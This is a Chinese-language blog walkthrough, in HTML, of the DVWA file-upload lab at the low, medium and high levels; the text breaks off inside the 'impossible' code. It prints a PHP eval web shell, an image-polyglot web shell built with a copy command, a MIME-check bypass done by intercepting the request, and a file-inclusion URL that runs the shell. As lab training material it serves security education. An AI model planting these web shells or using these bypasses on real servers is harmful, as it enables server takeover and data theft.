@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="UPLOAD文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的权限，因此文件上传漏洞带来的危害常常是毁灭性的。 low我们先上传一份正常的图片看看我们可以知道文件的位置，我们先来访问下看看我们现在知道了文件的路径，现在来写文件上传，首先我们先写一份php的一行木马 123&lt;?php @eval($_POST[&amp;#x27;hack&amp;#">
+<meta property="og:type" content="website">
+<meta property="og:title" content="upload">
+<meta property="og:url" content="http://example.com/dvwa-upload/upload.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="UPLOAD文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的权限，因此文件上传漏洞带来的危害常常是毁灭性的。 low我们先上传一份正常的图片看看我们可以知道文件的位置，我们先来访问下看看我们现在知道了文件的路径，现在来写文件上传，首先我们先写一份php的一行木马 123&lt;?php @eval($_POST[&amp;#x27;hack&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/1.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/4.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/5.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/2.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/6.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/7.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/8.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/9.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/10.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/11.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/12.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/13.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/14.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/15.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/16.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/17.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/18.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/19.png">
+<meta property="og:image" content="http://example.com/dvwa-upload/upload/20.png">
+<meta property="article:published_time" content="2021-01-28T07:46:58.000Z">
+<meta property="article:modified_time" content="2021-01-30T14:06:26.365Z">
+<meta property="article:author" content="ziyuexi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/dvwa-upload/upload/1.png">
+
+<link rel="canonical" href="http://example.com/dvwa-upload/upload">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>upload | blog
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">upload
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <h1 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h1><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的权限，因此文件上传漏洞带来的危害常常是毁灭性的。</p>
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p><img src="/dvwa-upload/upload/1.png" alt="A1"><br>我们先上传一份正常的图片看看<br><img src="/dvwa-upload/upload/4.png" alt="A1"><br>我们可以知道文件的位置，我们先来访问下看看<br><img src="/dvwa-upload/upload/5.png" alt="A1"><br>我们现在知道了文件的路径，现在来写文件上传，首先我们先写一份php的一行木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后进行文件上传<br><img src="/dvwa-upload/upload/2.png" alt="A1"><br>可以看到我们文件上传已经成功了，然后我们现在访问我们的木马。<br><img src="/dvwa-upload/upload/6.png" alt="A1"><br>可以看到是一片空白的因为我们的木马根本不是图片啊我们点开F12在hackbar下进行一些程序输入看看<br><img src="/dvwa-upload/upload/7.png" alt="A1"><br>比如我们输入这个命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack&#x3D;echo&#39;q&#39;;</span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-upload/upload/8.png" alt="A1"><br>我们看到命令运行成功，那么我们还可以干什么呢<br><img src="/dvwa-upload/upload/9.png" alt="A1"><br>可以输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+<p>来获得php信息，也就是说和php有关的命令这里我们全部可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack&#x3D;echo(__dir__);</span><br></pre></td></tr></table></figure>
+<p>我们认为，这样的一步一步输入命令的效率太低了那么我们可以使用菜刀或者蚁剑<br><img src="/dvwa-upload/upload/10.png" alt="A1"><br>这里我们使用蚁剑输入目前木马的url然后输入连接密码<br><img src="/dvwa-upload/upload/11.png" alt="A1"><br>我们可以看见我电脑的所有东西都被看见了。<br><img src="/dvwa-upload/upload/12.png" alt="A1"><br>我们还可以打开蚁剑的控制终端来使用电脑的cmd</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>我们可以看到服务器只负责上传文件对于后缀没有任何检查所以我们很容易就上传了木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个是利用了php中eval()函数，eval()函数会把字符串作为命令来执行例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>其实就等于直接 echo ‘1’运行结果就是1<br>比如我们的一句话木马就是给hack赋值，赋值的内容就是我们的恶意命令。</p>
+<hr>
+
+<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p><img src="/dvwa-upload/upload/13.png" alt="A1"><br>我们现在来做medium的题目，我们先把木马上传看看<br><img src="/dvwa-upload/upload/14.png" alt="A1"><br>可以发现服务器现在对于我们上传的文件做了格式的规定。<br>我们尝试在前端时对上传文件的格式进行修改<br><img src="/dvwa-upload/upload/15.png" alt="A1"><br>我们对它进行抓包可以看到有个filename,那么我们把我们的木马修改为jpg格式试一试<br><img src="/dvwa-upload/upload/16.png" alt="A1"><br>在burp中可以发现原先的1.php已经变为1.jpg，当然jpg格式下这样时没有用的那么我们修改后缀为php再放包过去<br><img src="/dvwa-upload/upload/17.png" alt="A1"><br>上传成功</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>我们可以看见这次多了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br></pre></td></tr></table></figure>
+<p>一个负责检查格式一个检查大小，但都是在前端检测，我们可以通过篡改包的形式来绕过这层检查</p>
+<hr>
+
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>我们先来看代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>可以发现这里使用了 getimagesize( $uploaded_tmp )来确保这是一个真图片那么我们需要制作一份图片木马<br>首先打开cmd然后输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 2.png&#x2F;b+1.txt&#x2F;a 6.png</span><br></pre></td></tr></table></figure>
+<p>这个命令其中a为ascii文件b为二进制文件二者相加得到6.png文件这样我们就把我们的一句话木马包含到6.png文件中<br><img src="/dvwa-upload/upload/18.png" alt="A1"><br>上传成功。<br>但是我们用蚁剑访问时并不能正常工作<br><img src="/dvwa-upload/upload/19.png" alt="A1"><br>这是因为木马还是以图片的形式存在的所以无法激活，那么我们可以借助在文件包含里面的功能<br>url输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;D:\phpStudy\WWW\dvwa\hackable\uploads\6.png</span><br></pre></td></tr></table></figure>
+<p>可以看到文件包含页面已经给我们打开了这个图片然后F12输入命令hack=phpinfo();<br><img src="/dvwa-upload/upload/20.png" alt="A1"></p>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>如果不存在文件包含漏洞那么这个检测方式还是比较保险的。</p>
+<hr>
+
+<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span 